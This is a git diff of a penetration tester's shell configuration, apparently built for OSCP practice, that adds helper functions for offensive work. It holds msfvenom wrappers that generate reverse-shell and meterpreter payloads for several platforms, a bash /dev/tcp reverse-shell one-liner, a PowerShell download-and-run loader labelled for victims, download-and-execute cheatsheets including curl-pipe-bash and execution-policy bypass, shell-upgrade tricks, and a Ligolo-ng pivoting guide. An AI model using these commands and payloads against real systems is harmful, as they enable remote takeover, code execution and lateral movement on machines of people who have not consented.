@@ -332,61 +332,243 @@ nico.down() { # nico.down <ruta|shortcut> [out]
   fi
 }
 
+# _____________________
+
 # -----------------------------
-# Netcat Listeners (con cheat)
+# Netcat Listeners & Shell Upgrade
 # -----------------------------
 
-# CheatSheet function
-function nc_cheatsheet() {
-  echo -e "\n---------------- CheatSheet ----------------"
-  echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
-  echo "[Ctrl+z]"
-  echo "stty raw -echo; fg"
-  echo "[Enter][Enter]"
-  echo "export TERM=xterm; stty size cols 254 rows 54"
-  echo "Si no hay python: script /dev/null -c bash"
-  echo "export SHELL=bash"
-  echo "--------------------------------------------"
-  echo
-}
-
-# Listener fijo en 4444 con rlwrap
-#alias nico.nc.win4444='rlwrap nc -nlvp 4444'
-nico.nc.win4444() {
-  local ip=$(nico.myip)
-  echo "──────────────────────────────"
-  echo "  🐉 Listener Windows revshell "
-  echo "──────────────────────────────"
-  echo "En la víctima (PowerShell):"
-  echo "iex ((New-Object System.Net.WebClient).DownloadString('http://${ip}/recon.ps1'))"
-  echo "──────────────────────────────"
-  echo "[*] Iniciando listener en 4444..."
-  rlwrap nc -nlvp 4444
-}
-
-# Fallback: listener manual (puerto dinámico, sin rlwrap)
+# Main function - Start listener with cheatsheet
 function nico.nc() {
-  if [[ -z "$1" ]]; then
+  # Check if port is provided
+  if [ -z "$1" ]; then
     echo "Uso: nico.nc <puerto>"
     return 1
   fi
+  
+  local port="$1"
+  
+  # Display cheatsheet first
   nc_cheatsheet
-  nc -nlvp "$1"
+  
+  # Get terminal size
+  get_term_size
+  
+  # Start listener
+  echo -e "\n[+] Starting listener on port $port..."
+  echo -e "[+] Waiting for connection...\n"
+  /usr/bin/nc -nlvp $port
 }
 
-# 5) msfvenom quickies (puerto opcional). Ej: nico.msf.win64 4444
+# Comprehensive shell upgrade cheatsheet
+function nc_cheatsheet() {
+  cat << 'EOF'
+
+╔════════════════════════════════════════════════════════════════╗
+║                    SHELL UPGRADE CHEATSHEET                    ║
+╚════════════════════════════════════════════════════════════════╝
+
+┌─[ 1. SCRIPT METHOD (PREFERRED) ]───────────────────────────────┐
+│ script /dev/null -c bash                                        │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─[ 2. PYTHON PTY METHOD ]───────────────────────────────────────┐
+│ python3 -c 'import pty; pty.spawn("/bin/bash")'                │
+│ python -c 'import pty; pty.spawn("/bin/bash")'                 │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─[ 3. SHELL NORMALIZATION (DO THIS AFTER SPAWN) ]───────────────┐
+│ [Ctrl+Z]                                                        │
+│ stty raw -echo; fg                                              │
+│ [Enter][Enter]                                                  │
+│ export TERM=xterm-256color                                      │
+│ export SHELL=bash                                               │
+│ stty rows 54 cols 254                                           │
+│ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin  │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─[ CHECK YOUR TERMINAL SIZE FIRST ]─────────────────────────────┐
+│ Run on YOUR machine: stty size                                  │
+│ Then set on target: stty rows <rows> cols <cols>               │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─[ ALTERNATIVE SPAWN METHODS ]──────────────────────────────────┐
+│ /bin/sh -i                                                      │
+│ /bin/bash -i                                                    │
+│ perl -e 'exec "/bin/sh";'                                       │
+│ ruby: exec "/bin/sh"                                            │
+│ lua: os.execute('/bin/sh')                                      │
+│ awk 'BEGIN {system("/bin/sh")}'                                 │
+│ find / -name blah -exec /bin/sh \;                              │
+│ vi: :!bash / :set shell=/bin/bash:shell                         │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─[ QUICK REFERENCE ]────────────────────────────────────────────┐
+│ Ctrl+C works after:  stty raw -echo; fg                         │
+│ Reset terminal:      reset / stty sane                          │
+│ Check if interactive: tty (should output /dev/pts/X)            │
+└─────────────────────────────────────────────────────────────────┘
+
+EOF
+}
+
+# Get current terminal dimensions
+function get_term_size() {
+  local size=$(stty size 2>/dev/null)
+  if [[ -n "$size" ]]; then
+    local rows=$(echo $size | cut -d' ' -f1)
+    local cols=$(echo $size | cut -d' ' -f2)
+    echo -e "\n[i] Your current terminal size: ${rows} rows x ${cols} cols"
+    echo "[i] Use: stty rows $rows cols $cols"
+  fi
+}
+
+
+# _____________
+
+# Listener configurable para Windows revshell
+# Uso: nico.nc.win [PUERTO]
+nico.nc.win() {
+  local port=${1:-4444} # Usa el primer argumento como puerto, sino usa 4444 por defecto
+  local ip=$(nico.myip)
+
+  echo "──────────────────────────────"
+  echo "  🐉 Listener Windows revshell "
+  echo "──────────────────────────────"
+  echo "Puerto seleccionado: ${port}"
+  echo "En la víctima (PowerShell):"
+  echo "iex ((New-Object System.Net.WebClient).DownloadString('http://${ip}/recon.ps1'))"
+  echo "──────────────────────────────"
+  echo "[*] Iniciando listener en ${port}..."
+  rlwrap nc -nlvp "${port}"
+}
+
+# 5) msfvenom quickies (puerto opcional). Ej: nico.msf.win64 4444# msfvenom helpers with optional LHOST (arg1), LPORT (arg2), OUTFILE (arg3)
+# Usage examples:
+#   nico.msf.win64             -> uses nico.myip() and port 4444, outfile shell_x64.exe
+#   nico.msf.win64 10.0.0.5    -> LHOST=10.0.0.5
+#   nico.msf.win64 10.0.0.5 5555 my.exe -> custom port and outfile
+
+_nico_msf_common() {
+  local payload="$1"; shift
+  local default_port="$1"; shift
+  local fmt="$1"; shift
+  local ext="$1"; shift
+  local lhost="${1:-$(nico.myip)}"
+  local lport="${2:-$default_port}"
+  local outfile="${3:-$(printf 'shell_%s.%s' "${payload//\//_}" "$ext" | tr '[:upper:]' '[:lower:]')}"
+  
+  # Validate LHOST
+  if [[ -z $lhost ]]; then
+    printf "Error: Could not determine LHOST. Please specify manually.\n" >&2
+    return 1
+  fi
+  
+  # If file exists, avoid silent overwrite
+  if [[ -e $outfile ]]; then
+    printf "File '%s' exists. Overwrite? [y/N]: " "$outfile" >&2
+    read -r yn
+    case "$yn" in
+      [Yy]*) ;;
+      *) printf "Aborted: not overwriting '%s'\n" "$outfile" >&2; return 1 ;;
+    esac
+  fi
+  
+  local cmd=(msfvenom -p "$payload" "LHOST=$lhost" "LPORT=$lport" -f "$fmt" -o "$outfile")
+  printf "\n[+] Generating payload...\n" >&2
+  printf "[*] Payload: %s\n" "$payload" >&2
+  printf "[*] LHOST: %s\n" "$lhost" >&2
+  printf "[*] LPORT: %s\n" "$lport" >&2
+  printf "[*] Output: %s\n\n" "$outfile" >&2
+  
+  if "${cmd[@]}"; then
+    printf "\n[+] Success! Payload saved to: %s\n" "$outfile" >&2
+    printf "[*] File size: %s\n" "$(du -h "$outfile" | cut -f1)" >&2
+    [[ $ext == "elf" ]] && chmod +x "$outfile" && printf "[*] Made executable\n" >&2
+    printf "\n[*] Listener command:\n" >&2
+    printf "    nc -nlvp %s\n\n" "$lport" >&2
+    return 0
+  else
+    printf "\n[-] Failed to generate payload\n" >&2
+    return 1
+  fi
+}
+
+# Windows payloads
 nico.msf.win64() {
-  local lhost="$(nico.myip)"; local lport="${1:-4444}"
-  msfvenom -p windows/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o shell_x64.exe
+  _nico_msf_common "windows/x64/shell_reverse_tcp" 4444 "exe" "exe" "$@"
 }
+
 nico.msf.win32() {
-  local lhost="$(nico.myip)"; local lport="${1:-4444}"
-  msfvenom -p windows/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o shell_x86.exe
+  _nico_msf_common "windows/shell_reverse_tcp" 4444 "exe" "exe" "$@"
 }
+
+nico.msf.win64.staged() {
+  _nico_msf_common "windows/x64/meterpreter/reverse_tcp" 4444 "exe" "exe" "$@"
+}
+
+nico.msf.win64.stageless() {
+  _nico_msf_common "windows/x64/meterpreter_reverse_tcp" 4444 "exe" "exe" "$@"
+}
+
+# Linux payloads
 nico.msf.lin64() {
-  local lhost="$(nico.myip)"; local lport="${1:-443}"
-  msfvenom -p linux/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o shell_x64.elf
+  _nico_msf_common "linux/x64/shell_reverse_tcp" 443 "elf" "elf" "$@"
 }
+
+nico.msf.lin32() {
+  _nico_msf_common "linux/x86/shell_reverse_tcp" 443 "elf" "elf" "$@"
+}
+
+# Web payloads (useful for OSCP)
+nico.msf.php() {
+  _nico_msf_common "php/reverse_php" 443 "raw" "php" "$@"
+}
+
+nico.msf.jsp() {
+  _nico_msf_common "java/jsp_shell_reverse_tcp" 443 "raw" "jsp" "$@"
+}
+
+nico.msf.war() {
+  _nico_msf_common "java/jsp_shell_reverse_tcp" 443 "war" "war" "$@"
+}
+
+nico.msf.aspx() {
+  _nico_msf_common "windows/x64/shell_reverse_tcp" 443 "aspx" "aspx" "$@"
+}
+
+# Python payload
+nico.msf.py() {
+  _nico_msf_common "python/shell_reverse_tcp" 443 "raw" "py" "$@"
+}
+
+# Bash payload
+nico.msf.sh() {
+  _nico_msf_common "cmd/unix/reverse_bash" 443 "raw" "sh" "$@"
+}
+
+# Helper to list all available msf functions
+nico.msf.list() {
+  printf "Available msfvenom helpers:\n\n"
+  printf "Windows:\n"
+  printf "  nico.msf.win64          - Windows x64 shell\n"
+  printf "  nico.msf.win32          - Windows x86 shell\n"
+  printf "  nico.msf.win64.staged   - Windows x64 meterpreter (staged)\n"
+  printf "  nico.msf.win64.stageless - Windows x64 meterpreter (stageless)\n"
+  printf "\nLinux:\n"
+  printf "  nico.msf.lin64          - Linux x64 shell\n"
+  printf "  nico.msf.lin32          - Linux x86 shell\n"
+  printf "\nWeb:\n"
+  printf "  nico.msf.php            - PHP reverse shell\n"
+  printf "  nico.msf.jsp            - JSP reverse shell\n"
+  printf "  nico.msf.war            - WAR reverse shell (Tomcat)\n"
+  printf "  nico.msf.aspx           - ASPX reverse shell (IIS)\n"
+  printf "\nScripting:\n"
+  printf "  nico.msf.py             - Python reverse shell\n"
+  printf "  nico.msf.sh             - Bash reverse shell\n"
+  printf "\nUsage: nico.msf.<type> [LHOST] [LPORT] [OUTFILE]\n"
+}
+
 
 # 6) Shortcuts de binarios comunes (servidos por httpTempServ.py)
 #    Estos comandos solo copian al docroot si prefieres apache; si usás httpTempServ, define SHORTCUTS en el .py
@@ -522,50 +704,398 @@ nico.rust.slow() {
 # Banner
 nico.banner() {
 cat <<'EOF'
-──────────────────────────────
-    🐉 NICO OSCP QUICK KIT 🐉
-──────────────────────────────
-Server:
-  nico.srv [port]          → Start HTTP server (SHORTCUTS: /recon.ps1 /recon.sh /mm.exe /nc.exe ...)
-  nico.srv [port] [pivot]  → Start HTTP server for Pivot
-Loaders:
-  nico.loader.linux        → Bash one-liner to load recon.sh
-  nico.loader.win          → PS one-liner to load recon.ps1
-Transfers:
-  nico.up f [name]         → Upload file to server
-  nico.down path [o]       → Download (supports shortcuts)
-Shells:
-  nico.nc                  → Netcat listener (nc pelado)
-  nico.nc.win4444          → Netcat listener 4444 (rlwrap)
-Payloads:
-  nico.msf.win64 p         → Win x64 rev shell
-  nico.msf.win32 p         → Win x86 rev shell
-  nico.msf.lin64 p         → Linux x64 rev shell
-Revs:
-  nico.rev.bash            → Bash rev shell "bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                      🐉 NICO OSCP QUICK KIT 🐉                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
 
-Scanning:
-  nico.nmap                → Full TCP scan (-p- -sS -sCV --min-rate 5000 ...)
-  nico.nmap.udp            → UDP scan (-sU -sS -sC -sV -oA nmap.udp)
-  nico.rust <IP>           → RustScan discovery → sudo nmap (-sS -sCV) [no overwrite]
-  nico.rust.slow <IP>      → Igual que arriba pero túneles (batch bajo/timeout alto)
-  rustscan <IP> -- -sV -sC → One-liner: discovery + nmap directo (rápido)
+┌─ SERVER ─────────────────────────────────────────────────────────────────────┐
+│ nico.srv [port]          → HTTP server (shortcuts: /recon.ps1 /nc.exe ...)  │
+│ nico.srv [port] [pivot]  → HTTP server for Pivot                            │
+│ nico.srv.cheat           → HTTP file transf cheat                           │
+│ nico.srv.kill            → kill srv                                         │
+└──────────────────────────────────────────────────────────────────────────────┘
 
-AutoRecon:
-  nico.autorecon IP -o ~/obsidian   → Full AutoRecon (incluye plugins long)
-  nico.autorecon.short              → AutoRecon rápido (excluye plugins long)
+┌─ LOADERS ────────────────────────────────────────────────────────────────────┐
+│ nico.loader.linux        → Bash one-liner to load recon.sh                  │
+│ nico.loader.win          → PowerShell one-liner to load recon.ps1           │
+└──────────────────────────────────────────────────────────────────────────────┘
 
-Banner:
-  nico.banner | nico.cheat  → Print this banner
-──────────────────────────────
+┌─ TRANSFERS ──────────────────────────────────────────────────────────────────┐
+│ nico.up f [name]         → Upload file to server                            │
+│ nico.down path [o]       → Download (supports shortcuts)                    │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ SHELLS ─────────────────────────────────────────────────────────────────────┐
+│ nico.nc [port]           → Netcat listener (default varies by function)     │
+│ nico.nc.win [port]       → Netcat listener with rlwrap (default 4444)       │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ PAYLOADS (msfvenom) ────────────────────────────────────────────────────────┐
+│ Usage: nico.msf.<type> [LHOST] [LPORT] [OUTFILE]                            │
+│                                                                              │
+│ Windows:                                                                     │
+│   nico.msf.win64          → Windows x64 shell (default: 4444)               │
+│   nico.msf.win32          → Windows x86 shell (default: 4444)               │
+│   nico.msf.win64.staged   → Windows x64 meterpreter staged (4444)           │
+│   nico.msf.win64.stageless → Windows x64 meterpreter stageless (4444)       │
+│                                                                              │
+│ Linux:                                                                       │
+│   nico.msf.lin64          → Linux x64 shell (default: 443)                  │
+│   nico.msf.lin32          → Linux x86 shell (default: 443)                  │
+│                                                                              │
+|         							               │
+│ Examples:                                                                    │
+│   nico.msf.win64                    → Auto LHOST, port 4444                 │
+│   nico.msf.win64 10.10.14.5         → Custom LHOST                          │
+│   nico.msf.win64 10.10.14.5 5555    → Custom LHOST and port                │
+│   nico.msf.php 10.10.14.5 443 rev.php → Full custom                         │
+│                                                                              │
+│ nico.msf.list             → Show detailed payload list                      │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ REVERSE SHELLS ─────────────────────────────────────────────────────────────┐
+│ nico.rev.bash            → Bash reverse shell one-liner                     │
+│                            bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ SCANNING ───────────────────────────────────────────────────────────────────┐
+│ nico.nmap <IP>           → Full TCP scan (-p- -sS -sCV --min-rate 5000)     │
+│ nico.nmap.udp <IP>       → UDP scan (-sU -sS -sC -sV -oA nmap.udp)          │
+│ nico.rust <IP>           → RustScan discovery → nmap (-sS -sCV)             │
+│ nico.rust.slow <IP>      → RustScan for tunnels (low batch/high timeout)    │
+│ rustscan <IP> -- -sV -sC → One-liner: discovery + nmap direct               │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ AUTORECON ──────────────────────────────────────────────────────────────────┐
+│ nico.autorecon <IP> -o ~/obsidian → Full AutoRecon (includes long plugins)  │
+│ nico.autorecon.short <IP>         → Quick AutoRecon (excludes long plugins) │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ HELP ───────────────────────────────────────────────────────────────────────┐
+│ nico.banner | nico.cheat → Show this banner                                 │
+│ nico.msf.list            → Detailed msfvenom payload list                   │
+│ nico.ligolo.cheat        → Ligolo-ng pivoting guide                         │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+EOF
+}
+nico.banner
+########## END ##########
+# cheat sheet
+alias nico.cheat=nico.banner
+
+# Ligolo-ng Cheatsheet
+nico.ligolo.cheat() {
+  local ip=$(nico.myip)
+  local port="${1:-11601}"
+cat <<EOF
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                      🐉 LIGOLO-NG PIVOT CHEATSHEET 🐉                        ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+┌─ OVERVIEW ───────────────────────────────────────────────────────────────────┐
+│ Ligolo-ng creates a tunneling interface to pivot through compromised hosts   │
+│ Components: Proxy (attacker) + Agent (victim)                                │
+│ Your IP: ${ip} | Port: ${port}                                       │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ STEP 1: ATTACKER SETUP (Proxy Server) ─────────────────────────────────────┐
+│ 1. Start the proxy with self-signed cert:                                   │
+│    sudo ./proxy -selfcert                                                    │
+│                                                                              │
+│ 2. Create tunnel interface (in ligolo-ng prompt):                           │
+│    ligolo-ng » interface_create --name "ligolo"                             │
+│                                                                              │
+│ Note: Keep this terminal open, proxy must stay running                      │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ STEP 2: VICTIM SETUP (Agent Client) ───────────────────────────────────────┐
+│ 1. Transfer agent to victim:                                                │
+│    wget http://${ip}:8000/agent                                      │
+│                                                                              │
+│ 2. Make executable:                                                          │
+│    chmod +x agent                                                            │
+│                                                                              │
+│ 3. Connect back to attacker proxy:                                          │
+│    ./agent -connect ${ip}:${port} -ignore-cert                      │
+│                                                                              │
+│ Expected output:                                                             │
+│    WARN[0000] warning, certificate validation disabled                      │
+│    INFO[0000] Connection established    addr="${ip}:${port}"        │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ STEP 3: ACTIVATE TUNNEL (Attacker) ────────────────────────────────────────┐
+│ 1. Select the active session:                                               │
+│    ligolo-ng » session                                                       │
+│    ? Specify a session: 1 - root@victim - 172.20.0.235:33084               │
+│                                                                              │
+│ 2. Start the tunnel:                                                         │
+│    [Agent : root@victim] » tunnel_start --tun ligolo                        │
+│                                                                              │
+│ 3. View victim's network interfaces:                                        │
+│    [Agent : root@victim] » ifconfig                                          │
+│                                                                              │
+│ 4. Add route to victim's internal network:                                  │
+│    [Agent : root@victim] » interface_add_route --name ligolo \              │
+│                            --route 192.168.1.0/24                            │
+│    INFO[0430] Route created.                                                │
+│                                                                              │
+│ Now you can access 192.168.1.0/24 directly from attacker!                   │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ STEP 4: PORT FORWARDING (Optional) ─────────────────────────────────────────┐
+│ Forward traffic from attacker to victim's localhost services:               │
+│                                                                              │
+│ [Agent : user@victim] » listener_add --addr 0.0.0.0:4443 \                  │
+│                         --to 127.0.0.1:4443 --tcp                            │
+│                                                                              │
+│ Example: Access victim's local port 4443 via attacker's 4443                │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ COMMON COMMANDS ────────────────────────────────────────────────────────────┐
+│ Proxy (Attacker):                                                            │
+│   session                     → List/select active sessions                 │
+│   interface_create --name X   → Create tunnel interface                     │
+│   interface_add_route ...     → Add route to internal network               │
+│   tunnel_start --tun X        → Start tunnel on interface                   │
+│   tunnel_stop                 → Stop active tunnel                          │
+│                                                                              │
+│ Agent (Victim):                                                              │
+│   ifconfig                    → Show network interfaces                     │
+│   listener_add ...            → Create port forward                         │
+│   listener_list               → Show active listeners                       │
+│   listener_stop --id X        → Stop listener                               │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ WORKFLOW SUMMARY ───────────────────────────────────────────────────────────┐
+│ Attacker: sudo ./proxy -selfcert                                            │
+│           interface_create --name "ligolo"                                  │
+│                                                                              │
+│ Victim:   ./agent -connect ${ip}:${port} -ignore-cert               │
+│                                                                              │
+│ Attacker: session → select agent                                            │
+│           tunnel_start --tun ligolo                                          │
+│           ifconfig → see victim networks                                     │
+│           interface_add_route --name ligolo --route TARGET_NET/CIDR         │
+│                                                                              │
+│ Result:   Direct access to victim's internal network from attacker          │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ TROUBLESHOOTING ────────────────────────────────────────────────────────────┐
+│ • Agent won't connect: Check firewall rules on port ${port}                 │
+│ • No route to network: Verify CIDR and interface name match                 │
+│ • Tunnel not working: Ensure sudo for proxy and tunnel_start executed       │
+│ • Port forward fails: Check if port is available on both sides              │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+┌─ QUICK COPY-PASTE ──────────────────────────────────────────────────────────┐
+│ Attacker proxy:  sudo ./proxy -selfcert                                     │
+│ Victim agent:    ./agent -connect ${ip}:${port} -ignore-cert        │
+│ Transfer agent:  wget http://${ip}:8000/agent && chmod +x agent     │
+└──────────────────────────────────────────────────────────────────────────────┘
+
 EOF
 }
 
-nico.banner
-########## END ##########
 
-# cheat sheet
-alias nico.cheat=nico.banner
+# _______________________________________________________________________________________
+
+# Generate download cheatsheet for any file
+nico.srv.cheat() {
+    if [ $# -eq 0 ]; then
+        echo "Usage: cheat <filename> [port] [ip]"
+        echo "Example: cheat mimikatz.exe"
+        echo "         cheat linpeas.sh 8080"
+        echo "         cheat exploit.py 8080 10.10.10.5"
+        return 1
+    fi
+    
+    local FILE="$1"
+    local PORT="${2:-80}"
+    local IP="${3:-$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)}"
+    
+    if [ -z "$IP" ]; then
+        IP="IP_KALI"
+    fi
+    
+    local is_exe=false
+    local is_ps1=false
+    local is_sh=false
+    
+    [[ "$FILE" == *.exe ]] && is_exe=true
+    [[ "$FILE" == *.ps1 ]] && is_ps1=true
+    [[ "$FILE" == *.sh ]] && is_sh=true
+    
+    echo ""
+    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
+    echo "║                          📡 DOWNLOAD CHEATSHEET                                ║"
+    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
+    echo ""
+    echo "File: $FILE"
+    echo "URL:  http://$IP:$PORT/$FILE"
+    echo ""
+    
+    if $is_exe || (! $is_ps1 && ! $is_sh); then
+        echo "#### 📦 WINDOWS DOWNLOAD"
+        echo "----"
+        echo "##### PowerShell"
+        echo "    IWR http://$IP:$PORT/$FILE -OutFile $FILE"
+        echo "    wget http://$IP:$PORT/$FILE -O $FILE"
+        echo "    (New-Object Net.WebClient).DownloadFile('http://$IP:$PORT/$FILE','$FILE')"
+        echo ""
+        echo "##### CMD"
+        echo "    certutil -urlcache -f http://$IP:$PORT/$FILE $FILE"
+        echo "    bitsadmin /transfer job http://$IP:$PORT/$FILE %CD%\\$FILE"
+        echo ""
+    fi
+    
+    if $is_exe; then
+        echo "##### Download + Execute"
+        echo "    IWR http://$IP:$PORT/$FILE -OutFile $FILE; .\\$FILE"
+        echo "    powershell -c \"IWR http://$IP:$PORT/$FILE -O $FILE; .\\$FILE\""
+        echo ""
+    fi
+    
+    if $is_ps1; then
+        echo "##### PowerShell Script Execution"
+        echo "    IEX(IWR http://$IP:$PORT/$FILE -UseBasicParsing)"
+        echo "    IEX(New-Object Net.WebClient).DownloadString('http://$IP:$PORT/$FILE')"
+        echo "    powershell -ep bypass -c \"IEX(IWR http://$IP:$PORT/$FILE -UseBasicParsing)\""
+        echo ""
+    fi
+    
+    echo "#### 🐧 LINUX DOWNLOAD"
+    echo "----"
+    echo "    wget http://$IP:$PORT/$FILE -O $FILE"
+    echo "    curl http://$IP:$PORT/$FILE -o $FILE"
+    echo "    curl -O http://$IP:$PORT/$FILE"
+    echo ""
+    
+    if $is_sh; then
+        echo "##### Download + Execute"
+        echo "    curl http://$IP:$PORT/$FILE | bash"
+        echo "    wget -qO- http://$IP:$PORT/$FILE | bash"
+        echo "    bash <(curl -s http://$IP:$PORT/$FILE)"
+        echo ""
+        echo "##### Source/Execute"
+        echo "    . <(curl http://$IP:$PORT/$FILE)"
+        echo "    source <(curl -s http://$IP:$PORT/$FILE)"
+        echo ""
+    fi
+    
+    if ! $is_ps1 && ! $is_sh; then
+        echo "##### Download + Execute (binary)"
+        echo "    wget http://$IP:$PORT/$FILE -O $FILE && chmod +x $FILE && ./$FILE"
+        echo "    curl http://$IP:$PORT/$FILE -o $FILE && chmod +x $FILE && ./$FILE"
+        echo ""
+    fi
+    
+    echo "#### 💡 ALTERNATIVE METHODS"
+    echo "----"
+    echo "##### Python"
+    echo "    python -c \"import urllib;urllib.urlretrieve('http://$IP:$PORT/$FILE','$FILE')\""
+    echo "    python3 -c \"import urllib.request;urllib.request.urlretrieve('http://$IP:$PORT/$FILE','$FILE')\""
+    echo ""
+    echo "##### Netcat Transfer"
+    echo "    [Server] nc -lvnp $PORT < $FILE"
+    echo "    [Target] nc $IP $PORT > $FILE"
+    echo ""
+    echo "##### /dev/tcp (bash)"
+    echo "    exec 3<>/dev/tcp/$IP/$PORT"
+    echo "    echo -e \"GET /$FILE HTTP/1.0\\n\" >&3"
+    echo "    cat <&3 > $FILE"
+    echo ""
+}
+
+
+
+# Kill httpTempServ instances interactively
+nico.srv.kill() {
+    # Find all running httpTempServ processes
+    local pids=($(pgrep -f 'httpTempServ'))
+    
+    if [ ${#pids[@]} -eq 0 ]; then
+        echo "❌ No httpTempServ instances running"
+        return 1
+    fi
+    
+    echo ""
+    echo "╔════════════════════════════════════════════════════════════════╗"
+    echo "║           🔴 Running httpTempServ Instances                    ║"
+    echo "╚════════════════════════════════════════════════════════════════╝"
+    echo ""
+    
+    # Display running instances with details
+    local i=1
+    local -A pid_map
+    
+    for pid in "${pids[@]}"; do
+        # Get port and directory info
+        local port=$(ss -tlnp 2>/dev/null | grep "pid=$pid" | awk '{print $4}' | rev | cut -d':' -f1 | rev | head -1)
+        local cmdline=$(ps -p $pid -o args= 2>/dev/null)
+        local cwd=$(pwdx $pid 2>/dev/null | cut -d' ' -f2-)
+        
+        if [ -z "$port" ]; then
+            port="N/A"
+        fi
+        
+        echo "[$i] PID: $pid"
+        echo "    Port: $port"
+        echo "    Dir:  $cwd"
+        echo "    Cmd:  $cmdline"
+        echo ""
+        
+        pid_map[$i]=$pid
+        ((i++))
+    done
+    
+    # Show options
+    echo "Options:"
+    echo "  [1-${#pids[@]}] Kill specific instance"
+    echo "  [a]         Kill all instances"
+    echo "  [q]         Cancel"
+    echo ""
+    
+    # Read user choice
+    echo -n "Choose: "
+    read choice
+    
+    case $choice in
+        q|Q)
+            echo "❌ Cancelled"
+            return 0
+            ;;
+        a|A)
+            echo ""
+            echo "💀 Killing all httpTempServ instances..."
+            for pid in "${pids[@]}"; do
+                kill $pid 2>/dev/null && echo "  ✓ Killed PID $pid" || echo "  ✗ Failed to kill PID $pid"
+            done
+            echo ""
+            return 0
+            ;;
+        [0-9]*)
+            if [ -n "${pid_map[$choice]}" ]; then
+                local target_pid=${pid_map[$choice]}
+                echo ""
+                echo "💀 Killing PID $target_pid..."
+                kill $target_pid 2>/dev/null && echo "  ✓ Killed successfully" || echo "  ✗ Failed to kill"
+                echo ""
+                return 0
+            else
+                echo "❌ Invalid choice: $choice"
+                return 1
+            fi
+            ;;
+        *)
+            echo "❌ Invalid option: $choice"
+            return 1
+            ;;
+    esac
+}
+
+
+# _______________________________________________________________________________________
 
 # Created by `pipx` on 2024-12-14 17:18:39
 export PATH="$PATH:/home/kali/.local/bin"
